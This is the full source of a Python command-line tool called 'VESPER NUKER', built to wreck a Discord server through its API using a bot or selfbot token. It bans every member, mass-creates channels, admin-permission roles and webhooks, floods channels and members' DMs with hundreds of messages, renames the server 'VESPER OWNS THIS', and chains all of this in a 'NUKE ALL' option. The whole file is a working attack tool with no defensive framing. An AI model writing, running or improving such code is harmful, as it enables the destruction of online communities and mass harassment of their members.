#!/usr/bin/env python3
# VESPER NUKER v1.1 — crash-safe build

import asyncio
import aiohttp
import json
import random
import string
import sys
import os
import time
import traceback
import ssl

# ---- Windows PyInstaller fix: force selector event loop BEFORE aiohttp import ----
if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except Exception:
    class _Dummy:
        def __getattr__(self, k):
            return ""
    Fore = Style = _Dummy()
    def init(*a, **k):
        pass


BANNER = r"""
 __      __  _____  _____  _____  _____  _____  
 \ \    / / |  ___|/  ___||  ___|| ___ \|  ___| 
  \ \  / /  | |__  \ `--. | |__  | |_/ /| |__  
   \ \/ /   |  __|  `--. \|  __| |    / |  __| 
    \  /    | |___ /\__/ /| |___ | |\ \ | |___ 
     \/     \____/ \____/ \____/ \_| \_|\____/ 
            V E S P E R   N U K E R   v1.1
"""

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vesper/1.1"


def pause_exit(code=0):
    print()
    print(Fore.LIGHTBLACK_EX + "[*] press ENTER to close...")
    try:
        input()
    except Exception:
        pass
    sys.exit(code)


def rand_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


class VesperNuker:
    def __init__(self, token, guild_id, is_bot):
        self.token = token.strip()
        self.guild_id = str(guild_id).strip()
        self.is_bot = is_bot
        prefix = "Bot " if is_bot else ""
        self.headers = {
            "Authorization": f"{prefix}{self.token}",
            "Content-Type": "application/json",
            "User-Agent": UA,
        }
        self.session = None
        self.sem = asyncio.Semaphore(15)

    async def __aenter__(self):
        # build SSL context that works inside PyInstaller exe
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(ssl=ctx, limit=100)
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=aiohttp.ClientTimeout(total=30),
            connector=connector,
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def _req(self, method, path, payload=None):
        url = API + path
        for attempt in range(6):
            async with self.sem:
                try:
                    async with self.session.request(method, url, json=payload) as r:
                        if r.status == 429:
                            try:
                                data = await r.json()
                                wait = float(data.get("retry_after", 1.0))
                            except Exception:
                                wait = 1.0
                            await asyncio.sleep(wait + 0.05)
                            continue
                        text = await r.text()
                        return r.status, text
                except Exception:
                    await asyncio.sleep(0.5)
                    continue
        return 0, "exhausted"

    async def fetch_guild(self):
        s, t = await self._req("GET", f"/guilds/{self.guild_id}")
        try:
            return json.loads(t) if s == 200 else None
        except Exception:
            return None

    async def fetch_channels(self):
        s, t = await self._req("GET", f"/guilds/{self.guild_id}/channels")
        try:
            return json.loads(t) if s == 200 else []
        except Exception:
            return []

    async def fetch_members(self):
        members = []
        after = "0"
        while True:
            s, t = await self._req("GET", f"/guilds/{self.guild_id}/members?limit=1000&after={after}")
            if s != 200:
                break
            try:
                data = json.loads(t)
            except Exception:
                break
            if not isinstance(data, list) or not data:
                break
            members.extend(data)
            after = data[-1]["user"]["id"]
            if len(data) < 1000:
                break
        return members

    async def ban_member(self, uid, name):
        s, _ = await self._req("PUT", f"/guilds/{self.guild_id}/bans/{uid}",
                               {"delete_message_seconds": 0})
        if s in (200, 201, 204):
            print(f"{Fore.RED}[BAN] {Fore.WHITE}{name} {Fore.LIGHTBLACK_EX}({uid}) {Fore.GREEN}ok")
            return 1
        print(f"{Fore.YELLOW}[BAN-FAIL] {Fore.WHITE}{name} {Fore.LIGHTBLACK_EX}({uid}) {Fore.RED}{s}")
        return 0

    async def ban_all(self):
        members = await self.fetch_members()
        print(f"{Fore.CYAN}[*] {len(members)} members queued for ban.")
        tasks = [self.ban_member(m["user"]["id"], m["user"]["username"]) for m in members]
        if tasks:
            await asyncio.gather(*tasks)

    async def channel_spam(self, base_name, count):
        print(f"{Fore.CYAN}[*] Creating {count} channels...")
        async def one(i):
            name = f"{base_name}-{rand_str(4)}" if base_name else f"vesper-{rand_str(6)}"
            s, _ = await self._req("POST", f"/guilds/{self.guild_id}/channels",
                                   {"name": name, "type": 0})
            if s in (200, 201):
                print(f"{Fore.MAGENTA}[CH] {name}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def message_spam(self, message, count, channel_id=None):
        if not channel_id:
            chans = await self.fetch_channels()
            text_chans = [c for c in chans if c.get("type") == 0]
            if not text_chans:
                print(f"{Fore.RED}[!] No text channels.")
                return
            channel_id = text_chans[0]["id"]
        print(f"{Fore.CYAN}[*] Spamming {count} messages into {channel_id}...")
        async def one(_):
            s, _ = await self._req("POST", f"/channels/{channel_id}/messages",
                                   {"content": message})
            if s in (200, 201):
                print(f"{Fore.BLUE}[MSG] -> {channel_id}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def rename_server(self, name):
        s, _ = await self._req("PATCH", f"/guilds/{self.guild_id}", {"name": name})
        if s in (200, 201):
            print(f"{Fore.GREEN}[+] Server renamed -> {name}")
        else:
            print(f"{Fore.RED}[!] Rename failed: {s}")

    async def dm_spam(self, message, count):
        members = await self.fetch_members()
        targets = [m for m in members if not m["user"].get("bot")]
        print(f"{Fore.CYAN}[*] DM spam {count} per target across {len(targets)} users...")
        async def one(user):
            s, t = await self._req("POST", "/users/@me/channels",
                                   {"recipient_id": user["user"]["id"]})
            if s not in (200, 201):
                return
            try:
                ch = json.loads(t)["id"]
            except Exception:
                return
            for _ in range(count):
                await self._req("POST", f"/channels/{ch}/messages", {"content": message})
            print(f"{Fore.LIGHTMAGENTA_EX}[DM] {user['user']['username']}")
        if targets:
            await asyncio.gather(*[one(m) for m in targets])

    async def role_spam(self, base_name, count):
        print(f"{Fore.CYAN}[*] Creating {count} admin roles...")
        async def one(_):
            name = f"{base_name}-{rand_str(4)}" if base_name else f"vesper-{rand_str(6)}"
            payload = {
                "name": name,
                "permissions": "8",
                "color": random.randint(0, 0xFFFFFF),
                "hoist": True,
                "mentionable": True,
            }
            s, _ = await self._req("POST", f"/guilds/{self.guild_id}/roles", payload)
            if s in (200, 201):
                print(f"{Fore.RED}[ROLE] {name}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def webhook_spam(self, base_name, count):
        chans = await self.fetch_channels()
        text_chans = [c for c in chans if c.get("type") == 0]
        if not text_chans:
            print(f"{Fore.RED}[!] No text channels for webhooks.")
            return
        print(f"{Fore.CYAN}[*] Creating {count} webhooks across {len(text_chans)} channels...")
        async def one(i):
            ch = random.choice(text_chans)["id"]
            name = f"{base_name}-{rand_str(4)}" if base_name else f"vesper-{rand_str(6)}"
            s, _ = await self._req("POST", f"/channels/{ch}/webhooks", {"name": name})
            if s in (200, 201):
                print(f"{Fore.LIGHTCYAN_EX}[WH] {name} -> {ch}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def bot_bypass_spam(self, message, per_channel):
        chans = [c for c in await self.fetch_channels() if c.get("type") == 0]
        if not chans:
            print(f"{Fore.RED}[!] No channels for bypass.")
            return
        print(f"{Fore.CYAN}[*] Bypass wave across {len(chans)} channels x {per_channel} msgs...")
        async def chan_worker(ch):
            for _ in range(per_channel):
                await self._req("POST", f"/channels/{ch['id']}/messages",
                                {"content": message, "tts": False})
            print(f"{Fore.LIGHTRED_EX}[BYPASS] {ch['id']}")
        await asyncio.gather(*[chan_worker(c) for c in chans])

    async def nuke_all(self, msg, count):
        print(f"{Fore.RED}{Style.BRIGHT}[!!!] FULL NUKE INITIATED")
        await self.rename_server("VESPER OWNS THIS")
        await asyncio.gather(
            self.channel_spam("vesper", count),
            self.role_spam("vesper", count),
            self.ban_all(),
        )
        await self.bot_bypass_spam(msg, 5)
        await self.webhook_spam("vesper", count)


MENU = f"""
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
{Fore.LIGHTMAGENTA_EX}              VESPER NUKER MENU
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
{Fore.WHITE} [1]  {Fore.RED}Ban All Members
{Fore.WHITE} [2]  {Fore.MAGENTA}Channel Create Spam
{Fore.WHITE} [3]  {Fore.BLUE}Message Spam
{Fore.WHITE} [4]  {Fore.YELLOW}Rename Server
{Fore.WHITE} [5]  {Fore.LIGHTRED_EX}Bot Bypass Spam
{Fore.WHITE} [6]  {Fore.LIGHTMAGENTA_EX}DM Spam
{Fore.WHITE} [7]  {Fore.RED}Role Spam (admin perms)
{Fore.WHITE} [8]  {Fore.LIGHTCYAN_EX}Webhook Spam
{Fore.WHITE} [9]  {Fore.LIGHTRED_EX}NUKE ALL
{Fore.WHITE} [0]  {Fore.LIGHTBLACK_EX}Exit
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
"""


def ask_int(prompt, default=500):
    try:
        v = input(prompt).strip()
        return int(v) if v else default
    except Exception:
        return default


async def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.LIGHTMAGENTA_EX + BANNER)

    mode = input(f"{Fore.WHITE}[?] Mode {Fore.LIGHTBLACK_EX}(1=Bot / 2=Selfbot){Fore.WHITE}: ").strip()
    is_bot = (mode == "1")

    token = input(f"{Fore.WHITE}[?] Token: ").strip()
    if not token:
        print(f"{Fore.RED}[!] No token provided.")
        return

    guild_id = input(f"{Fore.WHITE}[?] Server ID: ").strip()
    if not guild_id or not guild_id.isdigit():
        print(f"{Fore.RED}[!] Server ID must be numeric.")
        return

    try:
        async with VesperNuker(token, guild_id, is_bot) as n:
            try:
                g = await n.fetch_guild()
            except Exception as e:
                print(f"{Fore.RED}[!] Fetch error: {e}")
                traceback.print_exc()
                return

            if not g:
                print(f"{Fore.RED}[!] Auth failed or no access to guild.")
                print(f"{Fore.LIGHTBLACK_EX}    -> check token, check mode (bot vs selfbot), check server ID.")
                print(f"{Fore.LIGHTBLACK_EX}    -> make sure bot is invited to the server with admin.")
                return

            print(f"{Fore.GREEN}[+] Logged in -> {g.get('name')} ({g.get('id')})")
            print(f"{Fore.LIGHTBLACK_EX}    mode={'BOT' if is_bot else 'SELFBOT'}")

            while True:
                print(MENU)
                c = input(f"{Fore.LIGHTMAGENTA_EX}[vesper@root]{Fore.WHITE} ").strip()

                try:
                    if c == "1":
                        await n.ban_all()
                    elif c == "2":
                        name = input(f"{Fore.WHITE}[?] Channel base name: ").strip() or "vesper"
                        cnt = ask_int(f"{Fore.WHITE}[?] Count (500-900): ", 500)
                        await n.channel_spam(name, cnt)
                    elif c == "3":
                        msg = input(f"{Fore.WHITE}[?] Message text: ").strip()
                        cnt = ask_int(f"{Fore.WHITE}[?] Count (500-900): ", 500)
                        ch = input(f"{Fore.WHITE}[?] Channel ID (blank=first text): ").strip() or None
                        await n.message_spam(msg, cnt, ch)
                    elif c == "4":
                        name = input(f"{Fore.WHITE}[?] New server name: ").strip()
                        await n.rename_server(name)
                    elif c == "5":
                        msg = input(f"{Fore.WHITE}[?] Bypass message: ").strip()
                        per = ask_int(f"{Fore.WHITE}[?] Per-channel count (5-20): ", 10)
                        await n.bot_bypass_spam(msg, per)
                    elif c == "6":
                        msg = input(f"{Fore.WHITE}[?] DM text: ").strip()
                        cnt = ask_int(f"{Fore.WHITE}[?] Count per user (500-900): ", 500)
                        await n.dm_spam(msg, cnt)
                    elif c == "7":
                        name = input(f"{Fore.WHITE}[?] Role base name: ").strip() or "vesper"
                        cnt = ask_int(f"{Fore.WHITE}[?] Count (500-900): ", 500)
                        await n.role_spam(name, cnt)
                    elif c == "8":
                        name = input(f"{Fore.WHITE}[?] Webhook base name: ").strip() or "vesper"
                        cnt = ask_int(f"{Fore.WHITE}[?] Count (500-900): ", 500)
                        await n.webhook_spam(name, cnt)
                    elif c == "9":
                        msg = input(f"{Fore.WHITE}[?] Spam message: ").strip()
                        cnt = ask_int(f"{Fore.WHITE}[?] Count (500-900): ", 500)
                        await n.nuke_all(msg, cnt)
                    elif c == "0":
                        print(f"{Fore.LIGHTBLACK_EX}bye.")
                        return
                    else:
                        print(f"{Fore.RED}[!] bad choice.")
                except Exception as e:
                    print(f"{Fore.RED}[!] action error: {e}")
                    traceback.print_exc()
                    # keep going, don't kill the loop
    except Exception as e:
        print(f"{Fore.RED}[FATAL] {e}")
        traceback.print_exc()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTBLACK_EX}interrupted.")
    except Exception as e:
        print(f"{Fore.RED}[FATAL-TOP] {e}")
        traceback.print_exc()
    finally:
        pause_exit(0)
